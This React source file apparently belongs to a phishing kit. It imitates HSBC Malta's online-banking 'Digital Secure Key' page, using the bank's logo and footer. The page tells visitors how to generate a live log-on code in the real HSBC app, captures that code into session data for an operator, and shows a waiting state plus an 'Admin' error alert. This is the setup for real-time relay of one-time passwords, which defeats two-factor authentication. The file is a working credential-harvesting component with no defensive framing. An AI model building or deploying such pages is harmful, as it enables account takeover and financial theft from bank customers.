import { useState } from 'react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogTrigger } from '@/components/ui/dialog';
import { useForm } from '@/contexts/FormContext';
import { ChevronDown, Smartphone, ArrowRight, HelpCircle, Menu } from 'lucide-react';
import ErrorAlert from '@/components/ErrorAlert';
import hsbcLogo from '/uploaded/2cb7125c-8178-444d-9da1-b5b7641913ec.png';
import { getTimeBasedGreeting } from '@/lib/timeGreeting';

const OTPPage = () => {
  const [secureCode, setSecureCode] = useState('');
  const { updateSessionData, setWaiting, currentSession } = useForm();

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    updateSessionData('otp', { code: secureCode });
    setWaiting(true);
  };

  return (
    <div className="min-h-screen bg-gray-50 flex flex-col">
      {/* Header with hamburger menu and HSBC Logo */}
      <div className="bg-white shadow-sm">
        <div className="max-w-7xl mx-auto px-6 py-4 flex items-center justify-between">
          <div className="flex items-center space-x-4">
            <Menu className="h-6 w-6 text-gray-600" />
            <img 
              src={hsbcLogo} 
              alt="HSBC" 
              className="h-8 w-auto"
            />
          </div>
        </div>
      </div>

      {/* Main Content Container */}
      <div className="flex-1 flex flex-col">
        {/* Main Content */}
        <div className="flex-1 flex items-start justify-center px-6 pt-8">
          <div className="w-full max-w-md mx-auto">
            
            {/* Time-based greeting section */}
            <div className="mb-8">
              <div className="flex items-center space-x-2 text-gray-600 mb-6">
                <span className="text-lg">{getTimeBasedGreeting()}</span>
                <ChevronDown className="h-5 w-5" />
              </div>
            </div>

            {/* Digital Secure Key Section */}
            <div className="mb-8">
              <div className="flex items-center space-x-3 mb-6">
                <Smartphone className="h-6 w-6 text-gray-600" />
                <h2 className="text-lg font-medium text-gray-800">Digital Secure Key</h2>
              </div>
              
              <div className="space-y-6">
                <div className="flex items-center justify-between">
                  <label className="block text-sm font-medium text-gray-700">
                    Please enter your security code
                  </label>
                  <HelpCircle className="h-4 w-4 text-gray-400" />
                </div>

                {/* Error Alert from Admin */}
                <ErrorAlert />

                <form onSubmit={handleSubmit} className="space-y-6">
                  <div>
                    <Input
                      type="text"
                      value={secureCode}
                      onChange={(e) => setSecureCode(e.target.value)}
                      className="w-full h-12 px-4 border-2 border-red-400 focus:border-red-600 rounded text-gray-700 placeholder-gray-400 text-base focus:outline-none focus:ring-0"
                      placeholder=""
                      required
                    />
                    
                    {/* Required message - only when empty */}
                    {!secureCode.trim() && (
                      <div className="flex items-center space-x-2 mt-2 text-red-600">
                        <span className="text-sm">You must provide your security code.</span>
                      </div>
                    )}
                  </div>

                  {/* How to generate link with overlay */}
                  <div className="mb-6">
                    <Dialog>
                      <DialogTrigger asChild>
                        <button className="text-sm text-gray-700 hover:text-gray-900 inline-flex items-center">
                          How to generate a security code
                          <ArrowRight className="h-4 w-4 ml-1 text-red-500" />
                        </button>
                      </DialogTrigger>
                      <DialogContent className="sm:max-w-md bg-white border border-gray-200 shadow-lg z-50">
                        <DialogHeader>
                          <DialogTitle className="text-lg font-semibold text-gray-800">
                            How to generate a security code
                          </DialogTitle>
                        </DialogHeader>
                        <div className="space-y-4 mt-4">
                          <h4 className="text-sm font-medium text-gray-800">Get a security code:</h4>
                          <div className="space-y-2 text-sm text-gray-700">
                            <p>1. Open the HSBC app.</p>
                            <p>2. Don&apos;t log in.</p>
                            <p>3. Tap &quot;Generate a security code&quot; at the bottom.</p>
                            <p>4. Tap &quot;Log on code.&quot;</p>
                            <p>5. Put in your PIN or use face/fingerprint.</p>
                            <p>6. The app will show you a code – type that code into the box below.</p>
                          </div>
                        </div>
                      </DialogContent>
                    </Dialog>
                  </div>

                  {/* Log on Button */}
                  <div className="flex justify-end">
                    <Button
                      type="submit"
                      className={`px-8 py-3 text-white font-medium rounded text-base transition-all ${
                        secureCode.trim() 
                          ? 'bg-[hsl(0,100%,45%)] hover:bg-[hsl(0,100%,40%)]' 
                          : 'bg-[hsl(0,85%,60%)] hover:bg-[hsl(0,85%,55%)]'
                      }`}
                      disabled={!secureCode.trim()}
                    >
                      Log on
                    </Button>
                  </div>
                </form>

                {/* Forgotten password link */}
                <div className="pt-6">
                  <a 
                    href="#" 
                    className="text-sm text-gray-700 hover:text-gray-900 inline-flex items-center"
                    onClick={(e) => e.preventDefault()}
                  >
                    Forgotten your password?
                    <ArrowRight className="h-4 w-4 ml-1 text-red-500" />
                  </a>
                </div>
              </div>
            </div>
          </div>
        </div>

        {/* Footer */}
        <footer className="bg-black text-white py-6 mt-auto">
          <div className="max-w-7xl mx-auto px-6 text-center">
            <div className="text-sm space-y-2">
              <div className="flex items-center justify-center space-x-4">
                <span>Investor relations</span>
                <span>|</span>
                <span>HSBC Group</span>
                <span>|</span>
                <span>© HSBC Bank Malta p.l.c. 2025. All rights reserved.</span>
              </div>
              <div>
                <span>This website is designed for use in Malta. Cross-border banking</span>
              </div>
            </div>
          </div>
        </footer>
      </div>
    </div>
  );
};

export default OTPPage;